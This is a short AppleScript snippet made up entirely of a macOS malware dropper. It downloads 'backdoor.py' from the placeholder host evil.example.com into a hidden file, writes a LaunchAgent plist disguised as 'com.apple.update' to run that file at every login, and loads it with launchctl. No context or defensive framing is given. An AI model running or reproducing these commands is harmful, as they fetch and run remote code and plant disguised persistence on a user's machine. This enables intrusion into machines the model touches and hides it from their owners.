do shell script "curl -s -o ~/Library/Containers/.payload.py http://evil.example.com/backdoor.py"
do shell script "echo '<plist><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>~/Library/Containers/.payload.py</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.apple.update.plist"
do shell script "launchctl load ~/Library/LaunchAgents/com.apple.update.plist"
